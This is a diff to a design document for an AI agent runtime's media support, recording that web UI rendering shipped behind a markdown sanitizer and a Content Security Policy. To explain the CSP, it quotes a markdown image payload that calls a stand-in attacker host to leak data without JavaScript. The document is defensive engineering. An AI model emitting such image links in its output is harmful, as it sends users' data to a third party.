@@ -4,10 +4,11 @@ How images (and audio, video, PDFs, arbitrary files) get into a prompt, out of a
 tool, through the loop, and onto a screen — without breaking the text-only
 assumptions the runtime is built on today.
 
-Status: **P1-P4 shipped** — content parts, the media store, tools returning
-media, providers inlining it, per-model capabilities enforced before the
-request, and inbound attachments from Discord, Slack and the HTTP API. The UI
-composer and outbound rendering (P5) and the optional extras (P6) remain.
+Status: **P1-P5 shipped** for the web surface — content parts, the media store,
+tools returning media, providers inlining it, per-model capabilities enforced
+before the request, inbound attachments, and the UI rendering and composing
+media behind a sanitizer and a CSP. Outbound media on Discord/Slack and the CLI,
+plus the P6 extras, remain.
 
 ## Why now
 
@@ -749,10 +750,29 @@ worked only in tests. `media.*` config, `AgentRuntime.getMediaStore()` and the
 Still open for P5: the UI composer (file / paste / drop) and rendering media
 back out to a surface.
 
-**P5 — Outbound render.** `Channel.send` accepts `{ text, parts }`; Discord and
-Slack upload attachments; UI renders image parts; CLI prints the projection plus
-a path. **Ships with a markdown sanitizer and a CSP** — see below. *Tier 1 seam +
-tier 2 channels.*
+**P5 — Render surfaces. ✅ Shipped for the web UI; channels still to do.**
+`renderMarkdown` is now the single place markdown becomes HTML, and it
+sanitizes — the six call sites that piped `marked.parse()` straight into
+`dangerouslySetInnerHTML` all go through it. The server sends a CSP whose
+`img-src 'self' data:` is the part that matters. Images render inline in user,
+assistant and **tool-result** bubbles; the composer takes files by picker, paste
+and drop, uploading immediately so the send path stays JSON.
+
+The two defences cover different things and neither is redundant. The sanitizer
+stops scripts and event handlers, and still runs if a proxy strips the header.
+The CSP stops a *remote image from loading at all*, which is the exfiltration
+channel: `![](http://attacker/?q=…)` needs no JavaScript, so nothing about
+script-blocking touches it.
+
+Writing the sanitizer's tests caught a bug in the sanitizer itself: filtering
+URLs by scheme applies to every attribute, so blocking remote images had also
+stripped the `href` from every external link. Remote image sources are now
+removed in a hook that can see the tag, and `https:` links work again. A link is
+navigation the user chooses; an image `src` is an automatic fetch. Only the
+second is the vector.
+
+Still to do here: `Channel.send` carrying media out to Discord and Slack,
+`SurfaceCapabilities`, and the CLI's placeholder-plus-path rendering.
 
 **P6 — Optional, unscheduled.** OCR fallback; iTerm2 / kitty inline images in the
 CLI; audio and video adapters; a resize step for models with small size caps.
